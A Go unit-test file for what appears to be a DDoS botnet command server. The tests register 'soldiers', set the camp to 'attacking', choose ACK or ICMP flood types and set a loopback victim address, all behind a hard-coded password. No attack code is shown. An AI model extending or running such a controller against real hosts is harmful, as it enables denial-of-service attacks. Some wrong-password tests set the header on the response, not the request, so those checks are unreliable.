package dispatcher

import (
	"bytes"
	"net/http"
	"net/http/httptest"
	"testing"
)

func TestHandleCampGETInfo(t *testing.T) {
	d := NewDispatcher()
	d.SetupDefault()
	req, err := http.NewRequest("GET", "/camp", nil)
	if err != nil {
		t.Fatal(err)
	}
	rec := httptest.NewRecorder()
	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		HandleCamp(w, r, d)
	})
	handler.ServeHTTP(rec, req)

	if status := rec.Code; status != http.StatusOK {
		t.Errorf("GET /camp returned wrong status code: got %v want %v", status, http.StatusOK)
	}
}

func TestHandleCampPOSTSoldier(t *testing.T) {
	d := NewDispatcher()
	d.SetupDefault()

	jr := `{"name":"soldier"}`

	reader := bytes.NewReader([]byte(jr))

	req, err := http.NewRequest("POST", "/camp", reader)
	if err != nil {
		t.Fatal(err)
	}
	rec := httptest.NewRecorder()
	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		HandleCamp(w, r, d)
	})
	handler.ServeHTTP(rec, req)

	if status := rec.Code; status != http.StatusOK {
		t.Errorf("POST /camp returned wrong status code: got %v want %v", status, http.StatusOK)
	}

	// now check if the soldier name in d.camp.Soldiers is "soldier"
	if len(d.Cmp.Soldiers) != 1 {
		t.Errorf("POST /camp returned wrong status code: got %v want %v", len(d.Cmp.Soldiers), 1)
	}
	if d.Cmp.Soldiers[0].Name != "soldier" {
		t.Errorf("POST /camp returned wrong status code: got %v want %v", d.Cmp.Soldiers[0].Name, "soldier")
	}
}

func TestHandleCampDELETESoldierUnAuthorized(t *testing.T) {
	d := NewDispatcher()
	d.SetupDefault()

	d.Cmp.AddSoldier(Soldier{Name: "soldierName"})
	// add password to header
	req, err := http.NewRequest("DELETE", "/camp", bytes.NewReader([]byte("soldierName")))
	if err != nil {
		t.Fatal(err)
	}
	req.Header.Add("Authorization", "wrongPassword")

	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		HandleCamp(w, r, d)
	})
	rec := httptest.NewRecorder()
	handler.ServeHTTP(rec, req)

	if status := rec.Code; status != http.StatusUnauthorized {
		t.Errorf("DELETE /camp returned wrong status code: got %v want %v", status, http.StatusBadRequest)
	}

}

func TestHandleCampDELETESoldierAuthorized(t *testing.T) {
	d := NewDispatcher()
	d.SetupDefault()

	d.Cmp.AddSoldier(Soldier{Name: "soldierName"})
	// add password to header
	req, err := http.NewRequest("DELETE", "/camp", bytes.NewReader([]byte(`{"name":"soldierName"}`)))
	if err != nil {
		t.Fatal(err)
	}
	req.Header.Add("Authorization", "password")

	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		HandleCamp(w, r, d)
	})
	rec := httptest.NewRecorder()
	handler.ServeHTTP(rec, req)

	if status := rec.Code; status != http.StatusOK {
		t.Errorf("DELETE /camp returned wrong status code: got %v want %v", status, http.StatusOK)
	}
	if len(d.Cmp.Soldiers) != 0 {
		t.Errorf("camp soldiers not changed got %v want %v", len(d.Cmp.Soldiers), 0)
	}
}

func TestHandleCampUpdateStatus(t *testing.T) {
	d := NewDispatcher()
	d.SetupDefault()

	jr := `{"status":"attacking"}`

	req, err := http.NewRequest("PUT", "/camp", bytes.NewReader([]byte(jr)))
	if err != nil {
		t.Fatal(err)
	}
	req.Header.Add("Authorization", "password")

	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		HandleCamp(w, r, d)
	})
	rec := httptest.NewRecorder()
	handler.ServeHTTP(rec, req)

	if status := rec.Code; status != http.StatusOK {
		t.Errorf("PUT /camp returned wrong status code: got %v want %v", status, http.StatusOK)
	}

	if d.Cmp.Settings.Status != StatusAttacking {
		t.Errorf("camp status not changed got %v want %v", d.Cmp.Settings.Status, StatusAttacking)
	}

	// wrong test
	// add wrong password to header
	req, err = http.NewRequest("PUT", "/camp", bytes.NewReader([]byte(StatusStopped)))
	if err != nil {
		t.Fatal(err)
	}
	rec.Header().Set("Authorization", "wrongPassword")

	handler = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		HandleCamp(w, r, d)
	})
	rec = httptest.NewRecorder()
	handler.ServeHTTP(rec, req)

	if status := rec.Code; status != http.StatusUnauthorized {
		t.Errorf("PUT /camp returned wrong status code: got %v want %v", status, http.StatusUnauthorized)
	}
}

func TestHandleCampUpdateDDOSType(t *testing.T) {
	d := NewDispatcher()
	d.SetupDefault()

	jr := `{"ddos_type":"ACK"}`

	req, err := http.NewRequest("PUT", "/camp", bytes.NewReader([]byte(jr)))
	if err != nil {
		t.Fatal(err)
	}
	req.Header.Add("Authorization", "password")

	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		HandleCamp(w, r, d)
	})
	rec := httptest.NewRecorder()
	handler.ServeHTTP(rec, req)

	if status := rec.Code; status != http.StatusOK {
		t.Errorf("PUT /camp returned wrong status code: got %v want %v", status, http.StatusOK)
	}

	if d.Cmp.Settings.DDOSType != DDOSTypeACK {
		t.Errorf("camp ddos type not changed got %v want %v", d.Cmp.Settings.DDOSType, DDOSTypeACK)
	}

	// wrong test
	// add wrong password to header
	req, err = http.NewRequest("PUT", "/camp", bytes.NewReader([]byte(DDOSTypeICMP)))
	if err != nil {
		t.Fatal(err)
	}
	rec.Header().Set("Authorization", "wrongPassword")

	handler = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		HandleCamp(w, r, d)
	})
	rec = httptest.NewRecorder()
	handler.ServeHTTP(rec, req)

	if status := rec.Code; status != http.StatusUnauthorized {
		t.Errorf("PUT /camp returned wrong status code: got %v want %v", status, http.StatusUnauthorized)
	}
}

func TestHandleCampUpdateVictimTarget(t *testing.T) {
	d := NewDispatcher()
	d.SetupDefault()

	jr := `{"victim":"127.0.0.2:80"}`
	req, err := http.NewRequest("PUT", "/camp", bytes.NewReader([]byte(jr)))
	if err != nil {
		t.Fatal(err)
	}
	req.Header.Add("Authorization", "password")

	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		HandleCamp(w, r, d)
	})
	rec := httptest.NewRecorder()
	handler.ServeHTTP(rec, req)

	if status := rec.Code; status != http.StatusOK {
		t.Errorf("PUT /camp returned wrong status code: got %v want %v", status, http.StatusOK)
	}

	if d.Cmp.Settings.VictimServer != "127.0.0.2:80" {
		t.Errorf("camp ddos type not changed got %v want %v", d.Cmp.Settings.VictimServer, "127.0.0.2:80")
	}

	// wrong test
	// add wrong password to header
	req, err = http.NewRequest("PUT", "/camp", bytes.NewReader([]byte(`{"target":"127.0.0.3:80"}`)))
	if err != nil {
		t.Fatal(err)
	}
	rec.Header().Set("Authorization", "wrongPassword")

	handler = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		HandleCamp(w, r, d)
	})
	rec = httptest.NewRecorder()
	handler.ServeHTTP(rec, req)

	if status := rec.Code; status != http.StatusUnauthorized {
		t.Errorf("PUT /camp returned wrong status code: got %v want %v", status, http.StatusUnauthorized)
	}
}

func TestHandleSystem(t *testing.T) {
	d := NewDispatcher()
	d.SetupDefault()

	req, err := http.NewRequest("DELETE", "/server", nil)
	if err != nil {
		t.Fatal(err)
	}
	req.Header.Add("Authorization", "password")

	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		HandleSystem(w, r, d)
	})

	runTest := func() {
		rec := httptest.NewRecorder()
		handler.ServeHTTP(rec, req)
	}

	t.Run("panic", func(t *testing.T) {
		defer func() {
			if r := recover(); r == nil {
				t.Errorf("Expected HandleSystem to panic")
			} else {
				if r != "unexpected call to os.Exit(0) during test" {
					t.Errorf("Expected HandleSystem to panic with 'exit' but got %v", r)
				}
			}
		}()
		runTest()
	})
}
